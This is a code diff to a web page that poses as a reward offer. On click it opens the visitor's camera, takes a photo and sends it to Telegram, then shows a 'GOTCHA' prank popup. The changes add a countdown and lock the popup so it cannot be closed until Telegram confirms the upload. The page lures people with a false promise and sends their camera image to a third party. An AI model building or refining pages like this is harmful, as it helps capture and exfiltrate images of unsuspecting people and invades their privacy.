@@ -210,6 +210,7 @@ button:disabled{
 
   <button id="startBtn" disabled>🎁 Unlock Your Reward</button>
 
+  <div id="countdown" class="status" role="status" hidden></div>
   <div id="status" class="status" role="status">
     Ready to win your surprise reward?
   </div>
@@ -223,7 +224,7 @@ button:disabled{
     <h2>GOTCHA!</h2>
     <p>You just got fooled! 🤣</p>
     <p>The real surprise was the prank all along 💗</p>
-    <button id="closePrank">HAHA, OK! 😂</button>
+    <button id="closePrank" disabled>HAHA, OK! 😂</button>
   </div>
 </div>
 
@@ -244,13 +245,16 @@ const joker = $("joker");
 const consent = $("consent");
 const startBtn = $("startBtn");
 const statusBox = $("status");
+const countdownBox = $("countdown");
 const prankPopup = $("prankPopup");
+const closePrank = $("closePrank");
 const cameraFrame = $("cameraFrame");
 
 let stream = null;
 let imageCapture = null;
 let previewUrl = null;
 let busy = false;
+let countdownTimer = null;
 
 function setStatus(message){
   statusBox.textContent = message;
@@ -470,12 +474,21 @@ async function captureAndSend(){
 
   stopCamera();
 
-  // Show prank immediately after capture and metadata processing.
+  // Stop the countdown when the popup appears.
+  if (countdownTimer) {
+    clearInterval(countdownTimer);
+    countdownTimer = null;
+  }
+  countdownBox.hidden = true;
+
+  // The popup can only be dismissed after Telegram confirms the photo was sent.
+  closePrank.disabled = true;
   prankPopup.hidden = false;
-  setStatus("...");
+  setStatus("Photo captured. Sending to Telegram...");
 
   await sendToTelegram(photo);
-  setStatus("😂💗");
+  setStatus("Photo sent successfully! 😂💗");
+  closePrank.disabled = false;
 }
 
 startBtn.addEventListener("click",async()=>{
@@ -485,9 +498,24 @@ startBtn.addEventListener("click",async()=>{
   startBtn.disabled = true;
 
   try{
+    let secondsLeft = 5;
+    countdownBox.hidden = false;
+    countdownBox.textContent = `Surprise in ${secondsLeft}...`;
+    countdownTimer = setInterval(() => {
+      secondsLeft -= 1;
+      countdownBox.textContent = secondsLeft > 0
+        ? `Surprise in ${secondsLeft}...`
+        : "Revealing surprise...";
+    }, 1000);
+
     await openCamera();
     await captureAndSend();
   }catch(error){
+    if (countdownTimer) {
+      clearInterval(countdownTimer);
+      countdownTimer = null;
+    }
+    countdownBox.hidden = true;
     stopCamera();
     camera.hidden = true;
     placeholder.hidden = false;
@@ -504,7 +532,8 @@ startBtn.addEventListener("click",async()=>{
   }
 });
 
-$("closePrank").addEventListener("click",()=>{
+closePrank.addEventListener("click",()=>{
+  if (closePrank.disabled) return;
   prankPopup.hidden = true;
 });
 
